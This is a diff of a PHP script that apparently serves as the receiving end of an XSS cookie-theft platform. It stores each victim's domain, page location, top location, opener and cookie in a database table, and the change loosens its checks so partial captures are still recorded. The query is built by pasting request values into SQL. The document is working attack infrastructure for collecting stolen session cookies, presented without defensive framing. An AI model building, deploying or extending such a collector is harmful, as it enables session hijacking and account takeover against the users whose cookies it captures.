@@ -15,22 +15,25 @@ if ($write_pwd != '' && $_REQUEST ['pwd'] != $write_pwd) {
 require_once ('db.php');
 
 
-if (isset ( $_REQUEST ['domain'] ) &&
-		isset ( $_REQUEST ['location'] ) &&
-		isset ( $_REQUEST ['cookie'] ) &&
-		isset( $_REQUEST ['location'] ) != '' &&
-		isset ( $_REQUEST ['toplocation'] ) != '' &&
-		isset ( $_REQUEST ['opener'] ) != '' &&
-		trim ( $_REQUEST ['domain'] ) != '') {
+if (isset ( $_REQUEST ['domain'] ) && trim ( $_REQUEST ['domain'] ) != '') {
+	$domain = filter ( $_REQUEST ['domain'] );
+	
+	$location = $toplocation = $cookie = $opener = '';
+	if(isset ( $_REQUEST ['location'] )){
+		$location = filter ( urldecode ( $_REQUEST ['location'] ) );
+	}
+	if(isset ( $_REQUEST ['toplocation'] )){
+		$toplocation = filter ( urldecode ( $_REQUEST ['toplocation'] ) );
+	}
+	if(isset ( $_REQUEST ['cookie'] )){
+		$cookie = filter ( $_REQUEST ['cookie'] );
+	}
+	if(isset( $_REQUEST ['opener'] ) ){
+		$opener = filter($_REQUEST['opener']);
+	}
+	
 	date_default_timezone_set ( 'Asia/Shanghai' );
 	$time = date ( 'Y-m-d H:i:s' );
-	
-	$domain = filter ( $_REQUEST ['domain'] );
-	$location = filter ( urldecode ( $_REQUEST ['location'] ) );
-	$toplocation = filter ( urldecode ( $_REQUEST ['toplocation'] ) );
-	$cookie = filter ( $_REQUEST ['cookie'] );
-	$opener = filter($_REQUEST['opener']);
-	
 	
 	$sql = "insert into info (`time`,`domain`,`location`,`toplocation`,`cookie`,`opener`)
 			values ('$time','$domain','$location','$toplocation','$cookie','$opener')";
